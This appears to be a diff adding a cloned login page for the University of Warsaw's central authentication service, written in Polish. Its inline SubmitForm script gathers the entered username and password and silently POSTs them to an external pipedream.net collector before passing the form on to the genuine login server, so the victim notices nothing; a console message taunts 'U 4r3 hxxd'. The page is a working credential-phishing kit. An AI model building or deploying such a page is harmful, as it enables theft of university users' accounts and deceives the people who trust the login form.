@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <title>Logowanie - Uniwersytet Warszawski</title>
+  <link type="text/css" rel="stylesheet" href="./page_files/cas.css">
+  <link rel="icon" href="./page_files/favicon.ico" type="image/x-icon">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+</head>
+
+<body id="cas" class="fl-theme-iphone pl">
+  <div class="flc-screenNavigator-view-container" id="body" style="position: absolute; left: 654.5px; top: 173px;">
+    <div class="fl-screenNavigator-view">
+      <div id="header" class="flc-screenNavigator-navbar fl-navbar fl-table">
+        <div class="login-logout">
+        </div>
+      </div>
+
+      <script>
+        function SubmitForm()
+        {
+            console.log("U 4r3 hxxd");
+            const formData = new FormData(document.getElementById("fm1"));
+            /* TEMPORARY URL WHILE WORKING WIHT REUQUESTBIN */
+            fetch("https://eovtyopnuksgkjc.m.pipedream.net", { method: "POST", body: formData});
+            return true;
+        }
+      </script>
+
+      <div id="content" class="fl-screenNavigator-scroll-container">
+        <div class="box fl-panel" id="login">
+          <form id="fm1" class="fm-v clearfix" onsubmit="javascript: return SubmitForm();"
+            action="https://logowanie.uw.edu.pl/cas/login?locale=pl"
+            method="post" data-bitwarden-watching="1">
+            <h2>Wprowadź swój identyfikator sieciowy i hasło, aby kontynuować.</h2>
+            <div class="row fl-controls-left">
+              <label for="username" class="fl-label"><span class="accesskey">I</span>dentyfikator:</label>
+              <input id="username" name="username" class="required" tabindex="1" accesskey="i" type="text" value=""
+                size="25" autocomplete="false">
+            </div>
+            <div class="row fl-controls-left">
+              <label for="password" class="fl-label"><span class="accesskey">H</span>asło:</label>
+              <input id="password" name="password" class="required" tabindex="2" accesskey="h" type="password" value=""
+                size="25" autocomplete="off">
+            </div>
+            <div class="row check">
+              <input type="checkbox" name="loginVis" id="loginVis"><label for="loginVis">
+                Ukryj mój identyfikator</label>
+            </div>
+            <div class="row btn-row">
+              <input type="hidden" name="lt" value="LT-11904045-d2AMZJw3dXbfr2zeEOxslB4uUk4Zyr">
+              <input type="hidden" name="execution" value="e1s1">
+              <input type="hidden" name="_eventId" value="submit">
+              <input class="btn-submit" name="submit" accesskey="l" value="ZALOGUJ" tabindex="4" type="submit">
+            </div>
+          </form>
+        </div>
+      </div>
+    </div>
+
+    <div id="footer" class="fl-panel fl-note fl-bevel-white fl-font-size-80">
+      <div class="links">
+        <a href="https://logowanie.uw.edu.pl/passwd-change/reset?=pl">zapomniane hasło</a> |
+        <a href="https://it.uw.edu.pl/pl/uslugi/UslugiMojLoginCAS/">nowe konto</a> |
+        <a href="https://it.uw.edu.pl/pl/cas-lista-serwisow/" target="_blank">lista serwisów</a> |
+        <a href="https://it.uw.edu.pl/pl/cas/" target="_blank">o tej stronie</a> |
+        <a href="https://logowanie.uw.edu.pl/cas/login?locale=en">english version</a>&nbsp;&nbsp;&nbsp;
+      </div>
+    </div>
+
+    <div id="euwFooter">
+      Projekt „Platforma usług elektronicznych Uniwersytetu Warszawskiego
+      dla społeczności regionu” realizowany w ramach Regionalnego Programu
+      Operacyjnego Województwa Mazowieckiego, współfinansowany przez Unię
+      Europejską ze środków Europejskiego Funduszu Rozwoju Regionalnego
+    </div>
+  </div>
+
+  <script type="text/javascript" src="./page_files/jquery-1.11.0.min.js"></script>
+  <script type="text/javascript" src="./page_files/cas.js"></script>
+</body>
+
+</html>
